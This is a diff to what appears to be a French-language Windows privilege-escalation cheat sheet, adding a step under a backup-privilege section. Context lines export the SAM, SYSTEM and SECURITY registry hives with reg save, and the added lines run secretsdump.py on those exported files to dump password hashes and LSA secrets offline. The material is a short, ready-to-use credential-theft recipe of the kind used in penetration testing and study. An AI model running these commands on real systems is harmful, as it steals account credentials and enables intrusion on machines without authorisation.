@@ -186,6 +186,10 @@ whoami /priv
 reg save HKLM\SYSTEM system.save
 reg save HKLM\SAM sam.save
 reg save HKLM\SECURITY security.save
+
+# Offline dumping of SAM & LSA secrets from exported hives
+secretsdump.py -sam '/path/to/sam.save' -security '/path/to/security.save' -system '/path/to/system.save' LOCAL
+
 ```
 #### SeRestorePrivilege 
 Permet de remplacer des fichiers critiques du système:
